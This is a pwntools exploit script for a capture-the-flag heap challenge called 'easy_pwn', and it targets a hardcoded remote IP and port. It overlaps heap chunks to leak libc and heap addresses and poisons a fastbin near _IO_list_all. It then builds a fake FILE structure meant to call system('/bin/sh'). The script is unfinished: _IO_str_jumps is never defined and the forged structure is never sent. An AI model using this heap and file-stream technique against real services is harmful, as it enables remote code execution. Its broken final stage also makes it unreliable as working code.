import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./easy_pwn')
	elf=ELF('./easy_pwn')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('39.97.182.233',33434)
	elf=ELF('./easy_pwn')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def add(a):
	io.sendlineafter(': ','1')
	io.sendlineafter(': ',str(a))

def edit(a,b,c):
	io.sendlineafter(': ','2')
	io.sendlineafter(': ',str(a))
	io.sendlineafter(': ',str(b))
	io.sendlineafter(': ',c)

def show(a):
	io.sendlineafter(': ','4')
	io.sendlineafter(': ',str(a))

def delete(a):
	io.sendlineafter(': ','3')
	io.sendlineafter(': ',str(a))


add(0x90)
add(0x18)
add(0x18)
add(0xa0)
add(0x18)
add(0xe0)
add(0x18)


delete(0)
edit(2,0x22,'2'*0x10+p64(0xe0)+'\xb0')

delete(3)
add(0x90)
delete(5)
show(1)

io.recv(9)
malloc_hook_addr=u64(io.recv(8))-0x10-88
heap_base=u64(io.recv(8))-0x1b0
libc.address=malloc_hook_addr-libc.sym['__malloc_hook']
success('libc_base:'+hex(libc.address))
success('heap_base:'+hex(heap_base))
success('malloc_hook_addr:'+hex(malloc_hook_addr))



add(0x68)
delete(1)
edit(3,0x68,p64(libc.sym['_IO_list_all']-0x23)+'\x00'*0x60)
add(0x68)
add(0x68)
add(0xf0)
edit(5,0x1b,'a'*0x13+p64(heap_base+0x2d0))
system = libc.sym['system']
_IO_list_all=libc.sym['_IO_list_all']
binsh = libc.search('/bin/sh\x00').next()
from FILE import *
context.arch = 'amd64'
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_IO_list_all-0x10
fake_file._IO_buf_base = binsh
fake_file._mode = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = _IO_str_jumps-8













gdb.attach(io)
pause()
io.interactive()